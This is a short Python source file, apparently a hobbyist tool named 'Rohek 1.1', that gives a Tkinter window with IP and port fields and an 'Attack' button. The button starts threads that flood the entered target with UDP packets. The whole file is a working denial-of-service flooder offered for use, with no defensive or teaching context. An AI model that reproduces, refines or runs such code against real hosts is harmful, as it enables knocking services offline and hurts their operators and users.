import tkinter as tk
import os
import socket
import threading

#Rohek 1.1 Mobile Version

packet_count = 0
print_lock = threading.Lock()

def attack(ip, port):
    global packet_count
    message = "Meow! "
    ip_addr = socket.gethostbyname(ip)
    ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ddos.connect((ip_addr, port))
    for i in range(10000):
        try:
            ddos.sendto(message.encode(), (ip_addr, port))
            with print_lock:
                packet_count += 1
        except socket.error as msg:
            with print_lock:
                print("|[Connection Failed] |")
    ddos.close()

def start_attack():
    ip = ip_entry.get()
    port = int(port_entry.get())
    for i in range(1000000000):
        t = threading.Thread(target=attack, args=(ip, port))
        status_label.config(text="Attacking...")
        t.daemon = True
        t.start()
        t.join()
        i = i + 1

root = tk.Tk()

ip_label = tk.Label(root, text="Wus is da ip? ")
ip_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=5)

port_label = tk.Label(root, text="Port:")
port_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, padx=10, pady=5)

attack_button = tk.Button(root, text="Attack", command=start_attack)
attack_button.grid(row=3, columnspan=2, column=1, padx=10, pady=10)

status_label = tk.Label(root, text="")
status_label.grid(row=3, columnspan=2)

root.mainloop()